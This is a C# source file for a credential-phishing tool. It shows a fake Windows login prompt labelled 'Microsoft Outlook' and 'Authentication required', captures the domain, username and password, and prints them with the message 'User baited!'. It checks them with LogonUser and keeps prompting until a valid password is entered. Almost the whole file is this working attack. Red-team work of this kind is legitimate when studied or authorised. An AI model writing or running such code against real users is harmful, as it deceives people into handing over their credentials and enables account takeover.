using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;

namespace ICU
{
    class Program
    {
        // Define the Windows LogonUser and CloseHandle functions.
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static extern bool LogonUser(String username, String domain, String password,
                int logonType, int logonProvider, ref IntPtr token);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public extern static bool CloseHandle(IntPtr handle);

        // Define the required LogonUser enumerations.
        const int LOGON32_PROVIDER_DEFAULT = 0;
        const int LOGON32_LOGON_INTERACTIVE = 2;

   
        public static void Main()
        {
            IntPtr tokenHandle = IntPtr.Zero;
            string userName, domainName, password;
            // Display the current user.
            Console.WriteLine("Logged on User: {0}",
                              WindowsIdentity.GetCurrent().Name);
            Console.WriteLine("Sending prompt to user...");
            //login
            bool login = false;
            try
            {
                do
                {
                    var credentials = CredentialUI.PromptForWindowsCredentials("Microsoft Outlook ", "Authentication required");
                    domainName = credentials.DomainName;
                    userName = credentials.UserName;
                    password = credentials.Password;
                    Console.WriteLine("User baited! information received: \n domain name: {0} \n username:{1}\n password:{2}", domainName, userName, password);
                    login = LogonUser(userName, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref tokenHandle);
                }
                while (!login);
                if (login)
                    Console.WriteLine("LOGIN SUCCESS! information received: \n domain name: {0} \n username:{1}\n password:{2}", domainName, userName, password);
            }
            catch(System.NullReferenceException nre)
            { Console.WriteLine("User pressed cancel :("); }

          
        }
    }
}
